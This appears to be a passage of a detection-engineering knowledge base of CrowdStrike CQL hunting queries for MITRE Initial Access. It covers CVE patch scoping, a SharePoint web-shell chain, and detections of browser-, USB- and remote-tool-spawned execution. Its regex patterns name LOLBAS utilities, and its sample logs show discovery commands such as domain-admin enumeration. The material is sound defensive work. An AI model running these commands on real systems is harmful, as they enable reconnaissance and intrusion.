> [!metadata]+ Detection Metadata
> tactic:: Initial Access
> technique_id:: T1190
> technique_name:: Exploit Public-Facing Application
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: cve_2025_1146___system_scoping_using_osversioninfo___logon_data.yml
> cql_hub_name:: CVE-2025-1146 - System Scoping using OsVersionInfo & Logon Data
> cql_hub_author:: CrowdStrike
> related_mitre_ids:: T1190
> required_modules:: Insight
> cql_hub_tags:: Monitoring
> tags:: CQL, MITRE/Initial_Access, CQL_Hub

* Detection Objective: The query below will look for Linux systems (Linux, K8, Containers) that need to be updated against CVE-2025-1146.
The query is based on the event OsVersionInfo which is generated every 24-hours, at sensor start, or at sensor update.
It attempts to merge in LogonType 2 and 10 to determine the last logged on user.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`cve_2025_1146___system_scoping_using_osversioninfo___logon_data.yml`), author: CrowdStrike.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight; Linux endpoint telemetry; container image/runtime telemetry. Validate that this telemetry/module exists in the environment before operational use.

```cql
/* 

The query below will look for Linux systems (Linux, K8, Containers) that need to be updated against CVE-2025-1146. 

The query is based on the event OsVersionInfo which is generated every 24-hours, at sensor start, or at sensor update.   

It attempts to merge in LogonType 2 and 10 to determine the last logged on user.

*/
 
// Get OsVersionInfo events; sent by sensor every 24-hours or at sensor start or update
#event_simpleName=OsVersionInfo
 
// Narrow search to only include Linux, Container, and K8 systems
| in(field="event_platform", values=[Lin, K8S])

// Enrich required fields from aid_master_main.csv
| aid=~match(file="aid_master_main.csv", column=[aid], include=[ProductType, Version, MAC, SystemManufacturer, SystemProductName, FirstSeen, Time], strict=false)
 
// Parse AgentVersion into individual components for evaluation
| AgentVersion=/^(?<majorVersion>\d+)\.(?<minorVersion>\d+)\.(?<buildNumber>\d+)\./
 
// Evaluate Linux Container Sensors
| case {
    event_platform=Lin ProductType=Pod majorVersion=6                                 | Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion<=5                 | Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=6  buildNumber<4705| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=10 buildNumber<4907| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=11 buildNumber<5003| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=12 buildNumber<5102| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=13 buildNumber<5202| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=14 buildNumber<5306| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=15 buildNumber<5403| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=16 buildNumber<5503| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=17 buildNumber<5603| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=18 buildNumber<5705| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=19 buildNumber<5807| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=20 buildNumber<5908| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod                                                | Status:="OK"          | event_platform:="Lin (Pod)";
    *;
}
// Evaluate Linux Sensors
| case {
    event_platform=Lin majorVersion=6                                  | Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion<=5                  | Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=6 buildNumber<16113 | Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=7 buildNumber<16209 | Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=10 buildNumber<16321| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=11 buildNumber<16410| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=13 buildNumber<16606| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=14 buildNumber<16705| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=15 buildNumber<16806| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=16 buildNumber<16909| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=17 buildNumber<17014| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=18 buildNumber<17131| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=19 buildNumber<17221| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=20 buildNumber<17308| Status:="NEEDS PATCH";
    event_platform=Lin                                                 | Status:="OK";
    *;
}
// Evaluate K8 Sensors
| case {
    event_platform=K8S majorVersion=6                                 | Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion<=5                 | Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=6 buildNumber<603  | Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=10 buildNumber<806 | Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=11 buildNumber<904 | Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=12 buildNumber<1002| Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=13 buildNumber<1102| Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=14 buildNumber<1203| Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=16 buildNumber<1403| Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=17 buildNumber<1503| Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=18 buildNumber<1605| Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=20 buildNumber<1808| Status:="NEEDS PATCH";
    event_platform=K8S                                                | Status:="OK";
    *;
}
 
// Aggregate results into tabular format
| groupBy([cid, aid], function=([selectLast([cid, cid, ComputerName, event_platform, Version, AgentVersion, Status, aip, LocalAddressIP4, MAC, SystemManufacturer, SystemProductName, FirstSeen, Time])]), limit=max)

// Add user logon data if available
| join(query={#event_simpleName=UserLogon LogonType=/^(2|10)$/ event_platform=Lin | groupBy([aid], function=[(selectLast([UserName, UID, LogonType]))])}, field=[aid], include=[UserName, UID, LogonType], start=7d, mode=left)
 
// Modify field names for easier reading
| rename([[cid, "Customer ID"],[aid, "Agent ID"], [event_platform, Platform], [aip, "External IP"]])

// Aggregate results into tabular format with cleaner ordering
| groupBy(["Customer ID", "Agent ID", ComputerName, UserName, UID, LogonType, Platform, Version, AgentVersion, Status, "External IP", LocalAddressIP4, MAC, SystemManufacturer, SystemProductName, FirstSeen, Time], function=[], limit=max)
 
// Set default values for easier reading
| default(value="-", field=[ComputerName, Version, AgentVersion, Status, LocalAddressIP4, MAC, SystemManufacturer, SystemProductName, FirstSeen, Time, UID, UserName, LogonType], replaceEmpty=true)

// Move LogonType to human readable
| case {
    LogonType=2 | LogonType:="Interactive";
    LogonType=10| LogonType:="SSH";
    *;
}
 
// Move timestamps from epoch to human readable
| formatTime(format="%F %T", as="FirstSeen", field=FirstSeen)
| formatTime(format="%F %T", as="LastSeen", field=Time) 

// Remove unnecessary field
| drop([Time])
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `cve_2025_1146___system_scoping_using_osversioninfo___logon_data.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1190]] - Exploit Public-Facing Application — CQL Hub: CVE-2025-53770 - SharePoint ToolShell

> [!metadata]+ Detection Metadata
> tactic:: Initial Access
> technique_id:: T1190
> technique_name:: Exploit Public-Facing Application
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: cve_2025_53770___sharepoint_toolshell.yml
> cql_hub_name:: CVE-2025-53770 - SharePoint ToolShell
> cql_hub_author:: CrowdStrike
> cql_hub_mitre_ids:: T1190, T1620
> related_mitre_ids:: T1190, T1620
> required_modules:: Insight
> cql_hub_tags:: Detection
> tags:: CQL, MITRE/Initial_Access, CQL_Hub

* Detection Objective: WebShell Discovery from w3wp.exe
* Telemetry Requirements: Endpoint
* Source: CQL Hub (`cve_2025_53770___sharepoint_toolshell.yml`), author: CrowdStrike.
* Original CQL Hub MITRE IDs: T1190, T1620.
* Related/Resolved MITRE IDs: T1190, T1620.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight; Microsoft SharePoint telemetry. Validate that this telemetry/module exists in the environment before operational use.

```cql
// CVE-2025-53770 - WebShell Discovery from w3wp.exe

correlate(
    cmd: {
        #event_simpleName=ProcessRollup2 event_platform=Win FileName="cmd.exe" ParentBaseFileName="w3wp.exe"
          } include: [aid, ComputerName, TargetProcessId, ParentBaseFileName, FileName, CommandLine],
    pwsh: {
        #event_simpleName=ProcessRollup2 event_platform=Win FileName="powershell.exe"
          | aid <=> cmd.aid
          | ParentProcessId <=> cmd.TargetProcessId
          } include: [aid, ComputerName, TargetProcessId, ParentBaseFileName, FileName, CommandLine],
    aspx: {
        #event_simpleName=/^(NewScriptWritten|WebScriptFileWritten)$/ event_platform=Win FileName=/\.aspx/i
          | aid <=> cmd.aid
          | ContextProcessId <=> pwsh.TargetProcessId
          } include: [aid, ComputerName, TargetFileName],
sequence=true, within=5m)

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: Falcon has native detection/prevention capabilities for this attack sequence. The following looks for:  ` w3wp.exe --> cmd.exe --> powershell.exe --> .aspx file write `
* Key Indicators: Review query output fields and filters from `cve_2025_53770___sharepoint_toolshell.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1190]] - Exploit Public-Facing Application — CQL Hub: CVE-2025-59287 - WSUS Identification+Vulnerability Query

> [!metadata]+ Detection Metadata
> tactic:: Initial Access
> technique_id:: T1190
> technique_name:: Exploit Public-Facing Application
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: cve_2025_59287___wsus_identification_vulnerability_query.yml
> cql_hub_name:: CVE-2025-59287 - WSUS Identification+Vulnerability Query
> cql_hub_author:: AAuraa
> related_mitre_ids:: T1190
> required_modules:: Insight
> cql_hub_tags:: Detection
> tags:: CQL, MITRE/Initial_Access, CQL_Hub

* Detection Objective: The query below outputs a list of your Windows servers with a Falcon sensor, tells you if they need to be patched for the CVE or not, when the data was last updated, and if WSUS was "detected".
https://www.reddit.com/r/crowdstrike/comments/1ohdzpm/comment/nlnti7p/

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`cve_2025_59287___wsus_identification_vulnerability_query.yml`), author: AAuraa.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
// Make a bad attempt to locate WSUS-involved devices
| defineTable(query={
  #repo = "base_sensor" #event_simpleName="ProcessRollup2" and "WSUS"
  | groupBy([ComputerName])
}, include=[ComputerName], name="LocateAnythingWSUS", start=1d)

// Get OsVersionInfo events; sent by sensor every 24-hours or at sensor start or update
| #event_simpleName=OsVersionInfo
 
// Narrow search to only include Windows systems
| in(field="event_platform", values=[Win])
| in(field=ProductName, values=["*server*"], ignoreCase=true)

| case {
    event_platform=Win MajorVersion=10 MinorVersion=0 BuildNumber=17763 SubBuildNumber<7922 | Status:="NEEDS PATCH";
    event_platform=Win MajorVersion=10 MinorVersion=0 BuildNumber=20348 SubBuildNumber<4297 | Status:="NEEDS PATCH";
    event_platform=Win MajorVersion=10 MinorVersion=0 BuildNumber=26100 SubBuildNumber<6905 | Status:="NEEDS PATCH";
    event_platform=Win MajorVersion=10 MinorVersion=0 BuildNumber=25398 SubBuildNumber<1916 | Status:="NEEDS PATCH";
    event_platform=Win MajorVersion=10 MinorVersion=0 BuildNumber=26100 SubBuildNumber<6905 | Status:="NEEDS PATCH";
    event_platform=Win MajorVersion=10 MinorVersion=0 BuildNumber=14393 SubBuildNumber<8524 | Status:="NEEDS PATCH";
    event_platform=Win MajorVersion=6 MinorVersion=2 BuildNumber=9200 SubBuildNumber<25728 | Status:="NEEDS PATCH";
    event_platform=Win MajorVersion=6 MinorVersion=3 BuildNumber=9600 SubBuildNumber<22826 | Status:="NEEDS PATCH";
    event_platform=Win                                                 | Status:="OK";
    *;
}
| OSVersion := format(format="%s.%s.%s.%s", field=[MajorVersion, MinorVersion, BuildNumber, SubBuildNumber])
 
// Aggregate results into tabular format
| groupBy([ComputerName], function=([selectLast([aid, ComputerName, event_platform, ProductName, OSVersion, Status, LocalAddressIP4, @timestamp])]), limit=max)
 
// Move timestamps from epoch to human readable
| formatTime(format="%F %T", as="LastUpdated", field=@timestamp) 
// Modify field names for easier reading
| rename([[aid, "Agent ID"], [event_platform, Platform]])

// Aggregate results into tabular format with cleaner ordering
| groupBy(["Agent ID", ComputerName, Platform, ProductName, OSVersion, Status, "External IP", LocalAddressIP4, LastUpdated], function=[], limit=max)
 
// Set default values for easier reading
| default(value="-", field=[ComputerName, OSVersion, Status, LocalAddressIP4, LastUpdated, WSUSDetected], replaceEmpty=true)
| case {
  match(file="LocateAnythingWSUS", field=ComputerName, column=ComputerName)
  | WSUSDetected := "Potentially";
  *
  | WSUSDetected := "No";
}
| drop(@timestamp)
| sort(WSUSDetected, ComputerName)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `cve_2025_59287___wsus_identification_vulnerability_query.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1190]] - Exploit Public-Facing Application — CQL Hub: CVE-2025-59287 vulnerable WSUS servers identification

> [!metadata]+ Detection Metadata
> tactic:: Initial Access
> technique_id:: T1190
> technique_name:: Exploit Public-Facing Application
> logscale_stream:: Endpoint, Other
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: cve_2025_59287_vulnerable_wsus_servers_identification.yml
> cql_hub_name:: CVE-2025-59287 vulnerable WSUS servers identification
> cql_hub_author:: Crowdstrike
> related_mitre_ids:: T1190
> required_modules:: Insight
> cql_hub_tags:: Hunting, Monitoring
> tags:: CQL, MITRE/Initial_Access, CQL_Hub

* Detection Objective: This query identifies WSUS servers that have the wsusservice enabled and that are vulnerable to CVE-2025-59287
* Telemetry Requirements: Endpoint, Other
* Source: CQL Hub (`cve_2025_59287_vulnerable_wsus_servers_identification.yml`), author: Crowdstrike.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight. Validate that this telemetry/module exists in the environment before operational use.

```cql
// Make table that contains Agent ID values of Windows systems with WSUS service discovered
| defineTable(query={
  #repo = "base_sensor" event_platform=Win #event_simpleName="ProcessRollup2" FileName="wsusservice.exe"
  | groupBy([aid], function=[]
  ) 
}, include=[aid], name="WsusServiceRunning", start=7d)

// Get OsVersionInfo events; sent by sensor every 24-hours or at sensor start or update
| #event_simpleName=OsVersionInfo event_platform=Win 
 
// Aggregate results to get latest information per Agent ID value
| groupBy([aid], function=([selectLast([@timestamp, ComputerName, event_platform, ProductName, LocalAddressIP4])]), limit=max)
 
// Merge details from AID Master
| match(file="aid_master_main.csv", field=[aid], include=[ProductType])

// Restrict above results to servers or domain controllers
| in(field="ProductType", values=[2,3])

// Evaluate Windows build numbers
| case {
    event_platform=Win MajorVersion=10 MinorVersion=0 BuildNumber=17763 SubBuildNumber<7922 | Status:="NEEDS PATCH";
    event_platform=Win MajorVersion=10 MinorVersion=0 BuildNumber=20348 SubBuildNumber<4297 | Status:="NEEDS PATCH";
    event_platform=Win MajorVersion=10 MinorVersion=0 BuildNumber=26100 SubBuildNumber<6905 | Status:="NEEDS PATCH";
    event_platform=Win MajorVersion=10 MinorVersion=0 BuildNumber=25398 SubBuildNumber<1916 | Status:="NEEDS PATCH";
    event_platform=Win MajorVersion=10 MinorVersion=0 BuildNumber=26100 SubBuildNumber<6905 | Status:="NEEDS PATCH";
    event_platform=Win MajorVersion=10 MinorVersion=0 BuildNumber=14393 SubBuildNumber<8524 | Status:="NEEDS PATCH";
    event_platform=Win MajorVersion=6 MinorVersion=2 BuildNumber=9200 SubBuildNumber<25728  | Status:="NEEDS PATCH";
    event_platform=Win MajorVersion=6 MinorVersion=3 BuildNumber=9600 SubBuildNumber<22826  | Status:="NEEDS PATCH";
    *                                                                                       | Status:="OK";
}
 
// Check to see if WSUS service was discovered on host
| case {
  match(file="WsusServiceRunning", field=aid, column=aid) | WsusService := "YES";
  *                                                       | WsusService := "NO";
}

// Oragnize table
| table([@timestamp, aid, ComputerName, WsusService, Status, ProductName, LocalAddressIP4], sortby=Status, order=asc, limit=50000)

// Make ProductType field human readable
| $falcon/helper:enrich(field=ProductType)

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: This CQL query helps to identify WSUS servers that are vulnerable to CVE-2025-59287  Reference: https://www.reddit.com/r/crowdstrike/comments/1ohdzpm/comment/nlp7men/
* Key Indicators: Review query output fields and filters from `cve_2025_59287_vulnerable_wsus_servers_identification.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1190]] - Exploit Public-Facing Application — CQL Hub: Exploitable Critical Vulnerabilities

> [!metadata]+ Detection Metadata
> tactic:: Initial Access
> technique_id:: T1190
> technique_name:: Exploit Public-Facing Application
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: exploitable_critical_vulnerabilities.yml
> cql_hub_name:: Exploitable Critical Vulnerabilities
> cql_hub_author:: ByteRay GmbH
> cql_hub_mitre_ids:: TA0001
> related_mitre_ids:: T1190
> cql_hub_tags:: Monitoring
> tags:: CQL, MITRE/Initial_Access, CQL_Hub

* Detection Objective: Shows Critical CVEs that are considered exploitable (based on ExploitStatusEnum > 30). Results are aggregated by CVE and exploitability state, including the number of affected hosts.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`exploitable_critical_vulnerabilities.yml`), author: ByteRay GmbH.
* Original CQL Hub MITRE IDs: TA0001.

#### Production-Ready CQL Query:

```cql
#event_simpleName=FEMVulnerabilityMutation
| FEMVulnerabilityMutation.VulnerabilityInstance.Cve.Severity = Critical
| FEMVulnerabilityMutation.VulnerabilityInstance.Cve.ExploitStatusEnum > 30
| groupBy([FEMVulnerabilityMutation.VulnerabilityInstance.Cve.Id, FEMVulnerabilityMutation.VulnerabilityInstance.Cve.Severity,FEMVulnerabilityMutation.VulnerabilityInstance.Cve.ExploitStatus],function=count(FEMVulnerabilityMutation.VulnerabilityInstance.HostInfo.Hostname))
| sort(_count)
| rename(field=[[FEMVulnerabilityMutation.VulnerabilityInstance.Cve.Id, CVE_ID], [FEMVulnerabilityMutation.VulnerabilityInstance.Cve.ExploitStatus, Ausnutzbarkeit], [FEMVulnerabilityMutation.VulnerabilityInstance.Cve.Severity, Severity],[_count,"Host(s)"]])
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `exploitable_critical_vulnerabilities.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1190]] - Exploit Public-Facing Application — CQL Hub: MongoDB Processes on Windows & Linux Hosts (CVE-2025-14847)

> [!metadata]+ Detection Metadata
> tactic:: Initial Access
> technique_id:: T1190
> technique_name:: Exploit Public-Facing Application
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: mongodb_processes_on_windows___linux_hosts__cve_2025_14847_.yml
> cql_hub_name:: MongoDB Processes on Windows & Linux Hosts (CVE-2025-14847)
> cql_hub_author:: ByteRay GmbH
> related_mitre_ids:: T1190
> required_modules:: Insight
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Initial_Access, CQL_Hub

* Detection Objective: This query identifies Windows and Linux Hosts running MongoDB processes.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`mongodb_processes_on_windows___linux_hosts__cve_2025_14847_.yml`), author: ByteRay GmbH.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight; MongoDB process/asset telemetry; Linux endpoint telemetry. Validate that this telemetry/module exists in the environment before operational use.

```cql
#event_simpleName=ProcessRollup2
| (event_platform=Win AND ImageFileName=/mongod\.exe|mongos\.exe/i) OR (event_platform=Lin AND ImageFileName=/mongod|mongos/i)
| table([@timestamp, aid, ComputerName, UserName, ImageFileName])
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `mongodb_processes_on_windows___linux_hosts__cve_2025_14847_.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1190]] - Exploit Public-Facing Application — CQL Hub: Packages in Container Images - Match Lookup File

> [!metadata]+ Detection Metadata
> tactic:: Initial Access
> technique_id:: T1190
> technique_name:: Exploit Public-Facing Application
> logscale_stream:: Cloud
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: packages_in_container_images___match_lookup_file.yml
> cql_hub_name:: Packages in Container Images - Match Lookup File
> cql_hub_author:: ByteRay
> related_mitre_ids:: T1190
> required_modules:: CSPM / ASPM / DSPM
> cql_hub_tags:: Hunting
> tags:: CQL, MITRE/Initial_Access, CQL_Hub

* Detection Objective: Parses packages from ImageVulnerabilityEvents and cross-references it with a lookup file to identify matching entries.

* Telemetry Requirements: Cloud
* Source: CQL Hub (`packages_in_container_images___match_lookup_file.yml`), author: ByteRay.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): CSPM / ASPM / DSPM; container image/runtime telemetry; CQL Hub lookup file availability. Validate that this telemetry/module exists in the environment before operational use.

```cql
ImageScanEventType = ImageVulnerabilityEvent
| array:eval("CVEMapping[]", asArray="PackageName[]", function={PackageName := splitString(by="\|",field="CVEMapping",index=1)})
| array:drop("CVEMapping[]")
| array:dedup("PackageName[]")
| array:reduceAll(array="PackageName[]",var=PackageName, function=groupBy(PackageName))
| match(file="compromised-npm-packages-shai-hulud.csv", field="PackageName",column="PackageName", ignoreCase=true)

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: A lookup file with a list of packages needs to be uploaded first.  Example: |PackageName|Version| |---|---| |Package|1.0.0|
* Key Indicators: Review query output fields and filters from `packages_in_container_images___match_lookup_file.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1133]] - External Remote Services

> [!metadata]+ Detection Metadata
> tactic:: Initial Access
> technique_id:: T1133
> technique_name:: External Remote Services
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Initial_Access

* Detection Objective: Identify remote-access client or server processes used in unusual contexts or followed by discovery commands. This is useful for exposed VPN/RDP/remote support abuse triage.
* Telemetry Requirements: ProcessRollup2, UserLogon

#### Production-Ready CQL Query:

```cql
// Title: Remote Access Session Followed by Discovery
// Focus: Remote access tooling launching shell/discovery utilities
#event_simpleName=ProcessRollup2
| ParentBaseFileName=/(mstsc|rdpclip|teamviewer|anydesk|screenconnect|connectwise|splashtop|vpnui)\.exe$/i
| ImageFileName=/\\(cmd|powershell|whoami|net|nltest|ipconfig|quser)\.exe$/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Remote access parent process with immediate host/domain discovery child process.
* Triage Steps: Validate remote session owner, MFA status, source IP, and whether commands align to authorized support work.
* Potential False Positives: Helpdesk sessions and legitimate remote administration.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","ParentBaseFileName":"TeamViewer.exe","FileName":"cmd.exe","CommandLine":"cmd /c net group \"domain admins\" /domain"}
```

---

### [[T1189]] - Drive-by Compromise

> [!metadata]+ Detection Metadata
> tactic:: Initial Access
> technique_id:: T1189
> technique_name:: Drive-by Compromise
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Initial_Access

* Detection Objective: Detect browsers spawning script interpreters, archive tools, or LOLBAS utilities soon after web content interaction. This catches drive-by exploit or malicious download execution chains.
* Telemetry Requirements: ProcessRollup2, DnsRequest

#### Production-Ready CQL Query:

```cql
// Title: Browser-Spun Script or LOLBAS Execution
// Focus: Browser parent launching interpreter or LOLBAS child
#event_simpleName=ProcessRollup2
| ParentBaseFileName=/^(chrome|msedge|firefox|iexplore|brave|opera)\.exe$/i
| ImageFileName=/\\(powershell|pwsh|cmd|wscript|cscript|mshta|rundll32|regsvr32|certutil|bitsadmin|curl|wscript)\.exe$/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine, SHA256HashData])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Browser parent process with suspicious execution child.
* Triage Steps: Collect browser URL history and downloaded file metadata; pivot to child process tree.
* Potential False Positives: Browser helper applications and legitimate downloads launched by users.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","ParentBaseFileName":"chrome.exe","FileName":"mshta.exe","CommandLine":"mshta C:\\Users\\alice\\Downloads\\invoice.hta"}
```

---

### [[T1091]] - Replication Through Removable Media

> [!metadata]+ Detection Metadata
> tactic:: Initial Access
> technique_id:: T1091
> technique_name:: Replication Through Removable Media
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Initial_Access

* Detection Objective: Detect execution from removable-drive paths or shortcut/script launchers that commonly propagate through USB media.
* Telemetry Requirements: ProcessRollup2, FileWritten

#### Production-Ready CQL Query:

```cql
// Title: Execution from Removable Media Path
// Focus: Script or binary execution from drive-root/removable style paths
#event_simpleName=ProcessRollup2
| CommandLine=/^[A-Z]:\\.*(\.lnk|\.vbs|\.js|\.bat|\.cmd|\.exe)/i OR ImageFileName=/\\Device\\HarddiskVolume\d+\\.*(autorun|setup|update)\.exe$/i
| ParentBaseFileName=/^(explorer|cmd|wscript|cscript)\.exe$/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Drive-letter root execution of shortcut/script/binary with explorer or script-host parent.
* Triage Steps: Determine whether media was inserted and inspect file origin/hash.
* Potential False Positives: Portable admin toolkits and installers from USB.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","ParentBaseFileName":"explorer.exe","FileName":"wscript.exe","CommandLine":"wscript.exe E:\\invoice.vbs"}
```

---

### [[T1078]] - Valid Accounts

> [!metadata]+ Detection Metadata
> tactic:: Initial Access
> technique_id:: T1078
> technique_name:: Valid Accounts
> logscale_stream:: UserLogon
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Medium
> tags:: CQL, MITRE/Initial_Access

* Detection Objective: Detect successful logons followed by rapid discovery or privilege-check commands, useful for compromised valid account triage.
* Telemetry Requirements: UserLogon, ProcessRollup2

#### Production-Ready CQL Query:

```cql
// Title: Valid Account Logon Followed by Discovery Burst
// Focus: Successful logon context followed by enumeration commands
#event_simpleName=ProcessRollup2
